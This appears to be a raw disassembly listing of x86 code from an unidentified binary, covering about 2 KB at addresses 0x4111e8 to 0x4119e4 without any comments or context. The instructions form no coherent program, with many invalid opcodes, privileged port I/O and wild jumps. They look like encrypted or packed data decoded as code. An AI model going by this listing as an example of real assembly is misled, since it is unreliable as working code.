  4111e8:	stos   DWORD PTR es:[edi],eax
  4111e9:	push   edi
  4111ea:	mov    cl,0xa6
  4111ec:	mov    ebx,0x305d0a5e
  4111f1:	lahf   
  4111f2:	inc    esp
  4111f3:	mov    ebx,0x5e8ea6bf
  4111f8:	in     eax,0x57
  4111fa:	push   0x24e6ce02
  4111ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411200:	clc    
  411201:	pop    es
  411202:	mov    ebp,0xb6e6edfa
  411207:	mov    eax,0x6d4bb61b
  41120c:	cli    
  41120d:	mov    DWORD PTR [esi+0x8],ecx
  411210:	nop
  411211:	int3   
  411212:	pop    ebx
  411213:	xchg   esi,eax
  411214:	adc    al,0xe3
  411216:	cmp    al,BYTE PTR [edi-0x1e]
  411219:	aaa    
  41121a:	push   0xb63e0f84
  41121f:	iret   
  411220:	cmp    eax,0xb53300a1
  411225:	jb     0x4111f6
  411227:	rol    bh,0x84
  41122a:	jl     0x4111b9
  41122c:	fsubr  DWORD PTR [ecx+0x4b]
  41122f:	test   BYTE PTR [ebp+ebx*4-0x66c286b4],bl
  411236:	dec    ebx
  411237:	fwait
  411238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411239:	xchg   ebp,eax
  41123a:	mov    ds:0x94bc87a6,al
  41123f:	push   ebp
  411240:	mov    WORD PTR [ecx],es
  411242:	pop    edi
  411243:	test   edi,esp
  411245:	sub    edx,edx
  411247:	loopne 0x4112a8
  411249:	pop    edi
  41124a:	push   esp
  41124b:	ja     0x411291
  41124d:	std    
  41124e:	sub    DWORD PTR [ebp-0x60],eax
  411251:	ret    
  411252:	int3   
  411253:	test   DWORD PTR [esi+0x40],eax
  411256:	push   eax
  411257:	jge    0x4112a7
  411259:	aam    0xae
  41125b:	ds and eax,0xa8f45b79
  411261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411262:	adc    ah,BYTE PTR [ebx-0x667c33de]
  411268:	not    cl
  41126a:	xor    dl,cl
  41126c:	jns    0x411258
  41126e:	mov    dh,0x84
  411270:	inc    edx
  411271:	pop    es
  411272:	mov    al,ds:0x2ef50523
  411277:	test   DWORD PTR [edi-0x19e0cab5],ebp
  41127d:	sbb    al,0x9e
  41127f:	test   DWORD PTR [ebx-0x1d],esp
  411282:	es mov ah,0x72
  411285:	adc    edx,ebx
  411287:	mov    al,0x22
  411289:	pop    ebx
  41128a:	pop    eax
  41128b:	pop    esp
  41128c:	sub    eax,0xc7c47090
  411291:	out    0x74,eax
  411293:	xrelease xchg BYTE PTR [edi],cl
  411296:	mov    al,0xf
  411298:	cdq    
  411299:	dec    ebx
  41129a:	mov    edx,DWORD PTR [ebx+0x34a77d3e]
  4112a0:	pop    eax
  4112a1:	push   edx
  4112a2:	dec    edx
  4112a3:	dec    edi
  4112a4:	(bad)
  4112a7:	mov    edi,0xa87bc6d
  4112ac:	or     al,0xdb
  4112ae:	fs je  0x4112b3
  4112b1:	or     eax,0x97bf753b
  4112b6:	iret   
  4112b7:	shl    DWORD PTR [ebx+0x523b4878],cl
  4112bd:	retf   0x85e8
  4112c0:	addr16 out dx,al
  4112c2:	aas    
  4112c3:	mov    ecx,0xa448893f
  4112c8:	adc    DWORD PTR [eax+0x70],esp
  4112cb:	jecxz  0x4112ff
  4112cd:	push   cs
  4112ce:	pop    ss
  4112cf:	outs   dx,DWORD PTR ds:[esi]
  4112d0:	jo     0x4112e0
  4112d2:	xor    al,BYTE PTR [ebp-0x697560e]
  4112d8:	ds pop ss
  4112da:	jle    0x41132d
  4112dc:	inc    esi
  4112dd:	rcl    BYTE PTR [esi-0x6c],0xd0
  4112e1:	xchg   esi,eax
  4112e2:	dec    edi
  4112e3:	and    bh,BYTE PTR [edx]
  4112e5:	or     al,0x55
  4112e7:	stos   BYTE PTR es:[edi],al
  4112e8:	push   cs
  4112e9:	call   0x964bbb0
  4112ee:	out    0x93,eax
  4112f0:	push   ss
  4112f1:	or     cl,dh
  4112f3:	gs push es
  4112f5:	inc    ebx
  4112f6:	lea    ebp,[edi+0x52d4db3e]
  4112fc:	in     eax,dx
  4112fd:	addr16 jae 0x4112b6
  411300:	scas   eax,DWORD PTR es:[edi]
  411301:	ja     0x411307
  411303:	add    ebp,esi
  411305:	dec    eax
  411306:	xchg   edx,eax
  411307:	dec    esi
  411308:	ds retf 
  41130a:	adc    BYTE PTR ds:0xe1d9e052,ch
  411310:	sub    ah,bh
  411312:	jl     0x4112c2
  411314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411315:	scas   al,BYTE PTR es:[edi]
  411316:	ss enter 0x7fb0,0x1f
  41131b:	gs out 0xaa,eax
  41131e:	dec    eax
  41131f:	sub    ah,ah
  411321:	jb     0x4112fc
  411323:	test   bl,dh
  411325:	out    0x32,al
  411327:	jnp    0x411381
  411329:	cmp    BYTE PTR [ebx+eax*2-0x42],ah
  41132d:	inc    esp
  41132e:	mov    ah,0xe1
  411330:	cmp    eax,esi
  411332:	inc    esi
  411333:	jbe    0x411394
  411335:	stc    
  411336:	pop    eax
  411337:	add    eax,0xe924e02e
  41133c:	xchg   esp,eax
  41133d:	(bad)  
  41133e:	push   ds
  41133f:	add    eax,0xceb76b3e
  411344:	pop    ebp
  411345:	aad    0xec
  411347:	test   BYTE PTR [esi-0x2152111c],0xa2
  41134e:	and    DWORD PTR [esi+0x68f32643],0x7d99c14c
  411358:	int3   
  411359:	push   0x7c5f8a0d
  41135e:	cs or  eax,0xeadae666
  411364:	sub    edx,esp
  411366:	mov    DWORD PTR [edx],esi
  411368:	mov    dl,0x57
  41136a:	mov    ebx,0x5bd0e9af
  41136f:	pop    edx
  411370:	adc    DWORD PTR [edi],edi
  411372:	rcl    DWORD PTR [eax-0x7addeb46],cl
  411378:	pop    eax
  411379:	mov    esp,edx
  41137b:	mov    edx,0xf89d26c4
  411380:	and    bl,cl
  411382:	add    eax,0x3ef83e06
  411387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411388:	inc    eax
  411389:	sub    al,0x5c
  41138b:	inc    esp
  41138c:	test   DWORD PTR [edi-0x48],edx
  41138f:	retf   
  411390:	aas    
  411391:	sbb    eax,ecx
  411393:	pop    es
  411394:	push   cs
  411395:	ror    BYTE PTR [ebp-0x51eac068],cl
  41139b:	adc    bl,cl
  41139d:	in     al,0xc7
  41139f:	test   eax,0x50d8e9b1
  4113a4:	fild   QWORD PTR [edx]
  4113a6:	je     0x4113a0
  4113a8:	rcr    edx,0x34
  4113ab:	test   DWORD PTR [edi],edi
  4113ad:	sti    
  4113ae:	out    0x77,eax
  4113b0:	sbb    esp,esp
  4113b2:	loope  0x411415
  4113b4:	mov    edi,0x670626e7
  4113b9:	mov    bl,0x2a
  4113bb:	xor    ch,ah
  4113bd:	mov    ebp,0xcb6ea5ec
  4113c2:	pop    ebp
  4113c3:	pop    eax
  4113c4:	repnz push edi
  4113c6:	adc    DWORD PTR ds:0xf838e0ea,esi
  4113cc:	mov    edx,DWORD PTR [ecx-0x1]
  4113cf:	jp     0x41143f
  4113d1:	test   al,0x21
  4113d3:	sbb    DWORD PTR [eax],edi
  4113d5:	add    DWORD PTR [ebx+0x3f7bf7],eax
  4113db:	mov    ebx,fs
  4113dd:	xor    esi,DWORD PTR [ebp+esi*8-0x44]
  4113e1:	push   ss
  4113e2:	cmp    al,BYTE PTR [ebp+0x3e2b8d71]
  4113e8:	aas    
  4113e9:	or     DWORD PTR [eax-0x3abe98c0],0x48e5fb0e
  4113f3:	sub    edx,DWORD PTR [esi-0x56]
  4113f6:	out    0x39,al
  4113f8:	mov    ch,BYTE PTR [esi]
  4113fa:	neg    DWORD PTR [edi+0x1d21053f]
  411400:	mov    al,ds:0xec917ccf
  411405:	sahf   
  411406:	or     al,0x93
  411408:	xor    BYTE PTR [ebx+ecx*1],ch
  41140b:	and    DWORD PTR [ebx],ebx
  41140d:	xchg   BYTE PTR [eax],ch
  41140f:	push   0x22978232
  411414:	aas    
  411415:	sbb    eax,DWORD PTR [esi+0x478e43f3]
  41141b:	imul   edi
  41141d:	out    0xe4,al
  41141f:	mov    ebp,esp
  411421:	add    BYTE PTR [ebp-0x42],bl
  411424:	jae    0x411454
  411426:	dec    edi
  411427:	cmp    BYTE PTR [eax-0x79aba589],bl
  41142d:	(bad)  
  41142e:	push   ds
  41142f:	aam    0x82
  411431:	mov    DWORD PTR [esi-0x79],esp
  411434:	cmp    eax,0x1b19c0de
  411439:	push   esp
  41143a:	sbb    eax,0x5ac21815
  41143f:	push   ss
  411440:	xor    DWORD PTR [edi],esp
  411442:	xlat   BYTE PTR ds:[ebx]
  411443:	jp     0x41146b
  411445:	clc    
  411446:	div    edx
  411448:	loopne 0x411455
  41144a:	pop    eax
  41144b:	cwde   
  41144c:	scas   eax,DWORD PTR es:[edi]
  41144d:	ja     0x4114ac
  41144f:	push   edi
  411450:	ds jnp 0x411424
  411453:	jle    0x41142f
  411455:	dec    edx
  411456:	push   ds
  411457:	cmp    DWORD PTR [eax+0x4d96ce6],esi
  41145d:	jne    0x41142b
  41145f:	push   ebx
  411460:	sbb    eax,0x3e48083f
  411465:	ins    DWORD PTR es:[edi],dx
  411466:	mov    esi,0x3d04ec70
  41146b:	xor    BYTE PTR [ecx],cl
  41146d:	out    0x80,al
  41146f:	jp     0x41141f
  411471:	mov    dl,0x6
  411473:	xor    esi,DWORD PTR [esi+ecx*2+0x133e62fb]
  41147a:	mov    ah,0x4e
  41147c:	fcom   QWORD PTR [ecx-0x583ef56e]
  411482:	dec    ebx
  411483:	pop    ecx
  411484:	dec    esi
  411485:	out    0x0,al
  411487:	aas    
  411488:	dec    eax
  411489:	xchg   esp,eax
  41148a:	jmp    0xe8c29827
  41148f:	stc    
  411490:	aas    
  411491:	jns    0x41142d
  411493:	push   ebp
  411494:	mov    DWORD PTR [ebx-0x194b6b53],esi
  41149a:	es cs out 0x2b,eax
  41149e:	jge    0x4114e7
  4114a0:	push   cs
  4114a1:	fidiv  DWORD PTR [ebp+0x5bf51291]
  4114a7:	bnd js 0x4114c9
  4114aa:	loopne 0x41143f
  4114ac:	ss and edi,esp
  4114af:	adc    BYTE PTR [ebp+0x12],0x18
  4114b3:	xchg   esp,eax
  4114b4:	push   edi
  4114b5:	rcr    edx,1
  4114b7:	pop    DWORD PTR [ecx+ebx*1+0x2b]
  4114bb:	fsubr  st(4),st
  4114bd:	xchg   esi,eax
  4114be:	push   edx
  4114bf:	jp     0x411480
  4114c1:	enter  0x406b,0x18
  4114c5:	out    0x98,al
  4114c7:	mov    eax,0x3ffe7aa4
  4114cc:	outs   dx,BYTE PTR ds:[esi]
  4114cd:	mov    eax,ds:0x3127f30e
  4114d2:	mov    edx,0xcafb680f
  4114d7:	(bad)  
  4114d9:	cmovo  eax,DWORD PTR [ebp+eax*2+0x3cca56e4]
  4114e1:	outs   dx,DWORD PTR ds:[esi]
  4114e2:	ins    BYTE PTR es:[edi],dx
  4114e3:	out    0x5e,al
  4114e5:	mov    ch,0x28
  4114e7:	int    0x81
  4114e9:	data16 fst QWORD PTR [edx+eax*2-0x18]
  4114ee:	pop    esp
  4114ef:	(bad)  
  4114f0:	(bad)  
  4114f1:	sub    DWORD PTR [edi+0x161579a4],esi
  4114f7:	and    eax,0x6b5af53e
  4114fc:	inc    edi
  4114fd:	outs   dx,BYTE PTR ds:[esi]
  4114fe:	mul    ebp
  411500:	std    
  411501:	out    0xfa,al
  411503:	or     BYTE PTR ds:0x7a977ad0,cl
  411509:	and    ebp,ecx
  41150b:	and    edi,DWORD PTR [esi]
  41150d:	xchg   ebx,eax
  41150e:	mov    ecx,0x92c7301a
  411513:	ret    
  411514:	mul    edi
  411516:	jb     0x4114e7
  411518:	mov    dl,0xa5
  41151a:	fild   WORD PTR [edi]
  41151c:	cmp    DWORD PTR [esi],0xee39d50c
  411522:	pop    ebx
  411523:	int3   
  411524:	push   eax
  411525:	ins    BYTE PTR es:[edi],dx
  411526:	test   al,0x9d
  411528:	push   ebx
  411529:	fstp   QWORD PTR [eax-0x14983d5c]
  41152f:	push   ds
  411530:	push   esp
  411531:	addr16 mov eax,0xf1113e61
  411537:	jl     0x4114f9
  411539:	push   eax
  41153a:	xchg   ebp,eax
  41153b:	jp     0x411558
  41153d:	fmul   st,st(0)
  41153f:	sbb    esp,eax
  411541:	jnp    0x411539
  411543:	hlt    
  411544:	(bad)  
  411545:	mov    esi,0x700bdc54
  41154a:	jne    0x411558
  41154c:	push   ds
  41154d:	push   cs
  41154e:	dec    esp
  41154f:	adc    dl,BYTE PTR [edi+0x2a]
  411552:	adc    al,BYTE PTR [ecx+edi*2-0x5bb8791b]
  411559:	(bad)  
  41155a:	and    BYTE PTR [edi+0x53],ah
  41155d:	and    eax,DWORD PTR ds:[ecx+edi*1-0x8d42c43]
  411565:	sbb    BYTE PTR [esi-0x5f],0x81
  411569:	adc    dl,BYTE PTR [ebx-0x7c]
  41156c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41156d:	(bad)  
  41156e:	fild   DWORD PTR [ebp+0xcbf51de]
  411574:	aas    
  411575:	xor    DWORD PTR [edx],ecx
  411577:	nop
  411578:	sbb    BYTE PTR [eax+0x33283c19],ch
  41157e:	add    eax,0xc8d5009f
  411583:	cdq    
  411584:	jle    0x4115bf
  411586:	arpl   ax,sp
  411588:	daa    
  411589:	es push eax
  41158b:	push   0x30
  41158d:	aad    0x5b
  41158f:	mov    esi,0xa16d15bb
  411594:	lock cwde 
  411596:	loope  0x411575
  411598:	push   es
  411599:	int    0xa4
  41159b:	test   DWORD PTR [ebx+0x3fbf41ef],ebp
  4115a1:	scas   eax,DWORD PTR es:[edi]
  4115a2:	xchg   ebx,eax
  4115a3:	mov    ds:0x587eb292,eax
  4115a8:	jnp    0x411591
  4115aa:	ret    0x8831
  4115ad:	dec    ebx
  4115ae:	or     BYTE PTR [esi],bl
  4115b0:	popa   
  4115b1:	call   0x5d9fc00
  4115b6:	pop    edx
  4115b7:	xor    al,0x14
  4115b9:	adc    DWORD PTR [esi-0x3a94b101],0xffffff84
  4115c0:	cmp    BYTE PTR [eax+0x33f62de],0x15
  4115c7:	or     BYTE PTR ss:[edx+0x1],dl
  4115cb:	pop    ss
  4115cc:	xor    eax,0x917628e8
  4115d1:	lahf   
  4115d2:	fcmovbe st,st(7)
  4115d4:	sub    eax,0x41a516d5
  4115d9:	iret   
  4115da:	sbb    eax,0x88bd4bf8
  4115df:	xchg   BYTE PTR [ecx],dh
  4115e1:	leave  
  4115e2:	lods   eax,DWORD PTR ds:[esi]
  4115e3:	mov    eax,0xe9dae1fc
  4115e8:	jmp    0x411635
  4115ea:	pop    esi
  4115eb:	addr16 sbb eax,0x3f9238b0
  4115f1:	mov    ah,0x2f
  4115f3:	pop    esp
  4115f4:	adc    BYTE PTR [edx+0xb],0xdc
  4115f8:	loopne 0x41158f
  4115fa:	inc    edi
  4115fb:	js     0x411594
  4115fd:	test   DWORD PTR [ebx-0x2f302f3c],0x275c7823
  411607:	sti    
  411608:	or     al,0x88
  41160a:	pop    ebx
  41160b:	in     al,dx
  41160c:	xchg   edx,eax
  41160d:	dec    eax
  41160e:	aam    0xdd
  411610:	das    
  411611:	call   0x1bfea530
  411616:	inc    esi
  411617:	cmp    dl,BYTE PTR [esi+ebp*8-0x19007ae4]
  41161e:	push   cs
  41161f:	call   0x4785f4cf
  411624:	hlt    
  411625:	lea    ecx,[esi-0x76]
  411628:	scas   al,BYTE PTR es:[edi]
  411629:	(bad)  
  41162b:	cmp    al,dl
  41162d:	out    0x23,eax
  41162f:	mov    al,0xa1
  411631:	imul   ecx
  411633:	fs mov al,0xe9
  411636:	or     BYTE PTR [eax+0x28be94dd],ah
  41163c:	je     0x4116ac
  41163e:	cli    
  41163f:	and    eax,0xb7d18d3f
  411644:	retf   
  411645:	cs or  eax,0xace62e82
  41164b:	push   ecx
  41164c:	call   0x7f340965
  411651:	mov    bh,0xbd
  411653:	and    eax,0xde5b1750
  411658:	add    cl,BYTE PTR [ecx-0x2f405bbd]
  41165e:	mov    ebp,0xb3347e7a
  411663:	xchg   BYTE PTR [edi-0x5e],bl
  411666:	sbb    bh,BYTE PTR [ebp*2-0x3aba2407]
  41166d:	mov    bh,0x5c
  41166f:	lods   al,BYTE PTR ds:[esi]
  411670:	cmp    esp,DWORD PTR [esi]
  411672:	mov    cl,0xb
  411674:	mov    ds:0x88a06e7,eax
  411679:	dec    esp
  41167a:	adc    dl,cl
  41167c:	mov    ecx,0xb8fbfdbd
  411681:	push   0x57a1965b
  411686:	nop
  411687:	fstp   TBYTE PTR [edi+edi*1]
  41168a:	popf   
  41168b:	test   DWORD PTR [edx-0x515ca905],ebx
  411691:	stc    
  411692:	in     al,0x81
  411694:	mov    al,0x6a
  411696:	dec    eax
  411697:	cmp    DWORD PTR [ecx+0x65e5d196],0x47
  41169e:	lods   al,BYTE PTR ds:[esi]
  41169f:	lock imul esp,edi,0x238315a6
  4116a6:	mul    DWORD PTR ds:0x60efb2f6
  4116ac:	and    DWORD PTR [eax],ebp
  4116ae:	pop    eax
  4116af:	fmul   QWORD PTR [esi+0x2c]
  4116b2:	and    dh,0x60
  4116b5:	add    eax,0x387d8e99
  4116ba:	cmp    bl,BYTE PTR [esp+ebx*4]
  4116bd:	js     0x41171a
  4116bf:	(bad)  
  4116c0:	xchg   edx,eax
  4116c1:	or     ebx,DWORD PTR [edx+0x3d2e484a]
  4116c7:	ins    DWORD PTR es:[edi],dx
  4116c8:	data16 stc 
  4116ca:	call   0x35a8e559
  4116cf:	xchg   ebx,eax
  4116d0:	mov    dl,0x24
  4116d2:	fisubr DWORD PTR [edx-0x6c]
  4116d5:	popf   
  4116d6:	add    cl,BYTE PTR [eax+0xe]
  4116d9:	int3   
  4116da:	push   ebp
  4116db:	repnz pop eax
  4116dd:	adc    al,0x5a
  4116df:	pushf  
  4116e0:	in     al,dx
  4116e1:	jecxz  0x4116de
  4116e3:	sub    DWORD PTR [esi],0xd13ccf40
  4116e9:	mov    esi,0x616fb5da
  4116ee:	lods   al,BYTE PTR ds:[esi]
  4116ef:	stos   BYTE PTR es:[edi],al
  4116f0:	aas    
  4116f1:	sub    ebp,DWORD PTR [edx+0x383af06d]
  4116f7:	adc    al,0x5b
  4116f9:	out    0xec,eax
  4116fb:	sbb    ah,cl
  4116fd:	dec    ebx
  4116fe:	cmp    al,0xa7
  411700:	mov    dl,0xf4
  411702:	cmp    al,0xdc
  411704:	push   ss
  411705:	push   ebp
  411706:	scas   al,BYTE PTR es:[edi]
  411707:	mov    ebp,0x16f0e6b3
  41170c:	sbb    bl,BYTE PTR [edx+edx*1]
  41170f:	mov    ds:0xf092e7da,al
  411714:	sub    cl,BYTE PTR [edx+0x265eded7]
  41171a:	inc    esp
  41171b:	js     0x41178c
  41171d:	push   ebx
  41171e:	pop    edx
  41171f:	mov    BYTE PTR [edx-0x33],dh
  411722:	shl    BYTE PTR [esi],1
  411724:	or     BYTE PTR [ecx-0x6c],0x84
  411728:	push   esi
  411729:	aam    0xed
  41172b:	jmp    0x41176c
  41172d:	imul   eax,DWORD PTR [eax],0xffffffa6
  411730:	mov    eax,ds:0x81a9e042
  411735:	out    0x4e,eax
  411737:	std    
  411738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411739:	inc    edx
  41173a:	arpl   WORD PTR [edx+ebx*2],sp
  41173d:	sbb    bl,dh
  41173f:	add    al,0xe1
  411741:	daa    
  411742:	pop    ebx
  411743:	pusha  
  411744:	mov    ebp,0xb54ac0a0
  411749:	out    0x0,eax
  41174b:	in     eax,0x26
  41174d:	inc    eax
  41174e:	arpl   WORD PTR [esi-0x72],di
  411751:	test   al,dl
  411753:	ror    DWORD PTR gs:[eax],0x63
  411757:	dec    eax
  411758:	cli    
  411759:	ret    
  41175a:	pop    ebx
  41175b:	lahf   
  41175c:	test   esi,esp
  41175e:	mov    dl,0xf3
  411760:	pop    ebx
  411761:	ficom  WORD PTR [edx+0x5c]
  411764:	adc    eax,0x7d11177e
  411769:	mov    bh,0x5d
  41176b:	sbb    ah,ah
  41176d:	jbe    0x41173a
  41176f:	sub    cl,ah
  411771:	out    0xda,eax
  411773:	sub    dl,0x49
  411776:	jecxz  0x41172b
  411778:	xor    eax,0xb775c168
  41177d:	mov    WORD PTR [edx-0x44],ds
  411780:	inc    ecx
  411781:	and    DWORD PTR [ebp+0x11],esp
  411784:	pop    esi
  411785:	mov    eax,DWORD PTR [edx]
  411787:	test   BYTE PTR [esi+0x3f2542d2],al
  41178d:	xchg   ecx,eax
  41178e:	sub    ax,0xd9f9
  411792:	push   ebp
  411793:	xchg   ebp,eax
  411794:	or     eax,esp
  411796:	mov    edx,0x133cf9e7
  41179b:	mov    ds:0x692a765c,al
  4117a0:	inc    ebp
  4117a1:	daa    
  4117a2:	jmp    0x17c6:0x1e02cb7e
  4117a9:	repnz dec eax
  4117ab:	sbb    al,0x61
  4117ad:	out    0xe2,al
  4117af:	jns    0x41174f
  4117b1:	cli    
  4117b2:	or     bh,BYTE PTR [esi+0x3f]
  4117b5:	xchg   ecx,eax
  4117b6:	outs   dx,BYTE PTR ds:[esi]
  4117b7:	icebp  
  4117b8:	cmp    dl,BYTE PTR [ecx]
  4117ba:	fnstcw WORD PTR [edi+0x244ee7b8]
  4117c0:	(bad)  
  4117c1:	pop    edx
  4117c2:	jb     0x411812
  4117c4:	push   es
  4117c5:	inc    esi
  4117c6:	arpl   si,dx
  4117c8:	dec    edi
  4117c9:	fcomp  QWORD PTR [esi+ebx*4+0x45]
  4117cd:	es ror esp,0xeb
  4117d1:	out    0x58,eax
  4117d3:	dec    esp
  4117d4:	dec    ebx
  4117d5:	ret    
  4117d6:	stos   BYTE PTR es:[edi],al
  4117d7:	pop    ss
  4117d8:	ja     0x411829
  4117da:	xchg   ebp,eax
  4117db:	out    dx,eax
  4117dc:	(bad)  
  4117dd:	retf   
  4117de:	pop    eax
  4117df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e0:	dec    esi
  4117e1:	mov    esp,0xe470b6ce
  4117e6:	call   0xf02:0xd3d48b63
  4117ed:	pop    es
  4117ee:	push   ds
  4117ef:	jecxz  0x411802
  4117f1:	lar    ebx,WORD PTR [eax-0x728a6afc]
  4117f8:	pop    ss
  4117f9:	(bad)  
  4117fa:	fstp   TBYTE PTR [ecx]
  4117fc:	out    dx,eax
  4117fd:	jmp    0xa513b4d0
  411802:	jns    0x4117d0
  411804:	or     DWORD PTR [edx-0x4],edi
  411807:	fs aas 
  411809:	jmp    0x411829
  41180b:	push   edi
  41180c:	or     bl,BYTE PTR [ebx-0x167f9643]
  411812:	mov    ds,WORD PTR [ebp-0x18]
  411815:	jmp    0xe0c4cdb6
  41181a:	ss in  eax,0x3f
  41181d:	aaa    
  41181e:	stc    
  41181f:	xor    dl,BYTE PTR [ebx]
  411821:	lods   al,BYTE PTR ds:[esi]
  411822:	aam    0xdd
  411824:	ds out 0x22,al
  411827:	fdivr  DWORD PTR [ecx-0x79e46985]
  41182d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41182e:	dec    ecx
  41182f:	(bad)  
  411831:	setnp  BYTE PTR [ecx+0x23]
  411835:	int3   
  411836:	in     eax,0xba
  411838:	ja     0x411820
  41183a:	cs out 0x68,eax
  41183d:	test   DWORD PTR [eax+0x45],eax
  411840:	cmp    eax,DWORD PTR [ebx]
  411842:	mov    al,0xb0
  411844:	jmp    0x7f1:0xefec5b06
  41184b:	ds shr esi,cl
  41184e:	int3   
  41184f:	in     eax,0xf5
  411851:	out    dx,al
  411852:	mov    edi,0x742d131b
  411857:	test   DWORD PTR [edi],edi
  411859:	inc    ebx
  41185a:	mov    ecx,0xed2f1dd6
  41185f:	pop    esi
  411860:	xor    ebp,esp
  411862:	je     0x411840
  411864:	and    dl,BYTE PTR [ebx]
  411866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411867:	xchg   ecx,eax
  411868:	pop    ebx
  411869:	out    0xa1,eax
  41186b:	test   BYTE PTR [edi],bh
  41186d:	shl    DWORD PTR [ecx+0x4f],0xa3
  411871:	sub    BYTE PTR [ebx],al
  411873:	sbb    al,BYTE PTR [esi]
  411875:	jle    0x411841
  411877:	pop    eax
  411878:	add    eax,0x7c319701
  41187d:	and    bh,BYTE PTR [ebp-0x2998f8fc]
  411883:	dec    ebp
  411884:	sbb    ebx,ebx
  411886:	pop    ebx
  411887:	push   ss
  411888:	or     BYTE PTR [ebx+0x44],0x8c
  41188c:	mov    edx,0x4284a65f
  411891:	or     eax,0xdf3e5c2d
  411896:	pop    edx
  411897:	shr    DWORD PTR [ecx+0x24],1
  41189a:	and    dh,al
  41189c:	test   esi,esp
  41189e:	sub    BYTE PTR ds:0x776f877e,dh
  4118a4:	cmp    eax,0xeaa3da3f
  4118a9:	ins    BYTE PTR es:[edi],dx
  4118aa:	pop    edx
  4118ab:	mov    al,0x2f
  4118ad:	add    eax,0xba2ceb1a
  4118b2:	scas   eax,DWORD PTR es:[edi]
  4118b3:	mov    dl,BYTE PTR [esi+0x27]
  4118b6:	xchg   edx,eax
  4118b7:	fst    DWORD PTR [ecx+0xb173a15]
  4118bd:	cwde   
  4118be:	pop    ebx
  4118bf:	pop    edx
  4118c0:	mov    ah,0x50
  4118c2:	jl     0x4118c3
  4118c4:	xchg   esi,eax
  4118c5:	cmp    DWORD PTR [esi-0x73804d7b],edi
  4118cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118cc:	mov    eax,ds:0x434fa8bc
  4118d2:	pop    esi
  4118d3:	inc    eax
  4118d4:	into   
  4118d5:	out    0x5a,al
  4118d7:	fisttp DWORD PTR [ecx+0x73]
  4118da:	inc    edi
  4118db:	cmp    ebx,ebp
  4118dd:	sbb    al,0x6b
  4118df:	mov    ds:0xe05c03e0,eax
  4118e4:	cmp    al,0x29
  4118e6:	xchg   edi,eax
  4118e7:	jg     0x4118cb
  4118e9:	data16 mov cl,0x97
  4118ec:	sbb    eax,0x8ffa23a8
  4118f1:	xor    bl,BYTE PTR [ebx-0x8]
  4118f4:	(bad)  
  4118f5:	loopne 0x411910
  4118f7:	sub    DWORD PTR [edx+0x2e85c12b],eax
  4118fd:	and    edi,DWORD PTR [edi-0x46]
  411900:	and    DWORD PTR [ecx-0x65],edi
  411903:	push   ebx
  411904:	cmc    
  411905:	out    0xca,eax
  411907:	ds shl edi,1
  41190a:	shr    eax,1
  41190c:	lock cwde 
  41190e:	push   cs
  41190f:	cdq    
  411910:	jg     0x4118e1
  411912:	push   eax
  411913:	mov    WORD PTR [ebx],?
  411915:	cmp    ecx,DWORD PTR [edi-0x7088c01a]
  41191b:	arpl   si,sp
  41191d:	pop    eax
  41191e:	rol    BYTE PTR [edx+0x100b2b10],1
  411924:	xchg   edx,eax
  411925:	cmp    eax,0xc4498598
  41192a:	jnp    0x411902
  41192c:	aaa    
  41192d:	scas   eax,DWORD PTR es:[edi]
  41192e:	ins    BYTE PTR es:[edi],dx
  41192f:	and    al,0x32
  411931:	aaa    
  411932:	(bad)
  411935:	js     0x411991
  411937:	mov    eax,ds:0x85ecac38
  41193c:	pop    ecx
  41193d:	mov    eax,0xb3139c7
  411942:	icebp  
  411943:	mov    dh,0xc
  411945:	test   DWORD PTR [ecx+0x35],ecx
  411948:	jb     0x4118d0
  41194a:	mov    edx,0x276d8691
  41194f:	test   ah,al
  411951:	mov    eax,ds:0xc53e5016
  411956:	dec    esi
  411957:	aaa    
  411958:	jnp    0x41192d
  41195a:	jb     0x411969
  41195c:	inc    ecx
  41195d:	adc    eax,0x5d5884b2
  411962:	js     0x4118e9
  411964:	push   eax
  411965:	ror    DWORD PTR [eax-0x43],1
  411968:	fisubr DWORD PTR [ebx-0x7b1e9099]
  41196e:	fs adc al,0xa0
  411971:	jl     0x411953
  411973:	gs sub al,0x13
  411976:	add    eax,DWORD PTR [ebp+edi*8-0x67fe1341]
  41197d:	out    0x8,eax
  41197f:	adc    dh,al
  411981:	nop
  411982:	gs into 
  411984:	rol    DWORD PTR ds:[eax-0x1e],1
  411988:	mov    cl,0xbb
  41198a:	adc    al,cl
  41198c:	push   cs
  41198d:	out    0x56,eax
  41198f:	loope  0x4119df
  411991:	sbb    ch,ah
  411993:	and    eax,DWORD PTR cs:[eax-0x2208922f]
  41199a:	pop    edx
  41199b:	jl     0x411969
  41199d:	int    0xf8
  41199f:	ds scas al,BYTE PTR es:[edi]
  4119a1:	scas   al,BYTE PTR es:[edi]
  4119a2:	cmp    DWORD PTR [ebp+edi*4+0x3ff43d52],eax
  4119a9:	cdq    
  4119aa:	mov    esp,0xaf1f546f
  4119af:	pop    eax
  4119b0:	mov    cl,0xe6
  4119b2:	je     0x411a2b
  4119b4:	ins    BYTE PTR es:[edi],dx
  4119b5:	and    BYTE PTR [esp+eax*8-0x29ed9fce],bh
  4119bc:	pop    eax
  4119bd:	jns    0x411a1a
  4119bf:	fiadd  DWORD PTR [edi+0x74a66b54]
  4119c5:	add    al,0x1c
  4119c7:	test   DWORD PTR [edx-0x3e],esp
  4119ca:	loope  0x4119fd
  4119cc:	inc    ebp
  4119cd:	gs xchg esp,eax
  4119cf:	(bad)  
  4119d0:	xchg   edx,eax
  4119d1:	mov    BYTE PTR [esp+eax*4],0x57
  4119d5:	xchg   edi,eax
  4119d6:	lods   eax,DWORD PTR ds:[esi]
  4119d7:	fiadd  WORD PTR [eax+0x22]
  4119da:	push   ebp
  4119db:	test   BYTE PTR [eax+0xe],cl
  4119de:	dec    ebp
  4119df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119e0:	ds ret 
  4119e2:	int    0xae
  4119e4:	jno    0x411a38
